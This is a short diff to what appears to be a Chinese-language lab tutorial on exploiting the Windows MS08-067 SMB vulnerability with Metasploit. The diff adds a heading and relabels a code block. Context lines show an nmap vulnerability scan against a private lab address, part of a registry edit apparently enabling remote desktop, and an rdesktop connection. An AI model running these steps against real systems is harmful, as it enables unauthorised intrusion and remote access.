@@ -2,12 +2,15 @@
 该资源是MS08-067远程代码执行漏洞，它是Windows Server服务RPC请求缓冲区溢出漏洞，利用445端口，并通过Metasploit工具获取shell及进行深入的操作。
 
 
+参考文章：<br />
+
+
 
 核心命令：
 
 <br />
 
-```c
+```shell
 # 端口查询
 nmap -n -p 445 --script smb-vuln-ms08-067 192.168.44.135 --open
 
@@ -49,3 +52,6 @@ echo reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Serve
 netstat -an
 rdesktop 192.168.44.135
 ```
+
+
+
